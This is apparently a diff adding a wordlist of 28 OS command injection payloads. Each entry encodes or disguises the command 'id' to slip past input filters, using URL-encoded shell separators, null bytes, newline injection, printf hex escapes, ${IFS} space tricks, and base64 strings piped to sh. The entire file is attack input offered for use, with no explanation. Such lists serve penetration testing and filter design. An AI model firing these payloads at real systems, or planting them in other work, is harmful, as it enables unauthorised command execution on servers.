@@ -1,0 +1,28 @@
+%69%64
+%3b%69%64
+%7c%69%64
+%26%26%69%64
+%60%69%64%60
+%24%28%69%64%29
+i%64
+%69d
+id%00
+id%00;ls
+;i%64;
+%3bid%3b
+%7cid%7c
+%26id%26
+%60id%60
+%24(id)
+;%69%64;
+%3b%69%64%3b
+%0a%69%64%0a
+%0d%0a%69%64
+$(printf '\x69\x64')
+$(printf %s id)
+$'\x69\x64'
+echo${IFS}aGVsbG8=|base64${IFS}-d|sh
+echo${IFS}aWQ=|base64${IFS}-d|sh
+bash${IFS}-c${IFS}id
+sh${IFS}-c${IFS}id
+/bin/sh${IFS}-c${IFS}id
